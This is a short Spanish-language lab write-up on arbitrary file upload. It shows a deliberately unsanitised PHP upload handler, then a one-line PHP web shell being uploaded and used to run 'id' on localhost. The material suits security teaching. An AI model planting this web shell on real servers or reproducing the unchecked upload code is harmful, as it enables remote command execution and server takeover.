
Voy a explicar como se acontece y como conseguir arbitrary file upload en mi propio laboratorio:

Tenemos este codigo en php:

``` php

<?php
if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $destination = "/var/www/html/uploads/" . $file['name'];
    move_uploaded_file($file['tmp_name'], $destination);
    echo "File uploaded: " . $destination;
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

```

Un codigo directamente vulnerable debido a que no sanitiza nada, puedo subir cualquier cosa al servidor sin ningun tipo de restriccion y se almacenara en la ruta /uploads.

Ejemplo de explotacion basica:

Subir un archivo php que me permita ejecutar comandos en el servidor mediante el parametro $GET:

```php

<?php system($_GET['cmd']); ?>
```

Lo subimos:

<img width="402" height="156" alt="image" src="https://github.com/user-attachments/assets/af173ba4-b527-41ec-a0ef-4f060282ce8f" />

Si nos vamos al endpoint http://localhost/uploads/cmd.php?cmd=id:

<img width="536" height="145" alt="image" src="https://github.com/user-attachments/assets/cd617576-51b4-4df5-b52d-330a2e86321e" />

Hay ejecuccion remota de comanda sin ninguna restricción.









